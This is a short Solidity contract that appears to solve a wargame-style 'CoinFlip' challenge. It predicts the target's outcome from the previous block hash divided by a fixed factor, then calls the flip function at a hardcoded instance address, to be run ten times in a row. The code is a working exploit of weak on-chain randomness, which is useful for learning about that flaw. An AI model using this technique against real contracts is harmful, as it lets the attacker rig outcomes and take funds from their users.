//generating random number is blockchain is not the easiest task

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Lucky {
    uint256 public count = 0;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address instAddr = 0x3cA6201c4cfBb7B957765e72f9c04AF968235552; //the addr of your instance

    function guess() external returns (uint256) {  //need to call this f 10 times in a row
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
          revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool win = ICoinFlip(instAddr).flip(side);
        if (win) {
            count++;
        } else {
            count = 0;
        }
        return count;
    }
}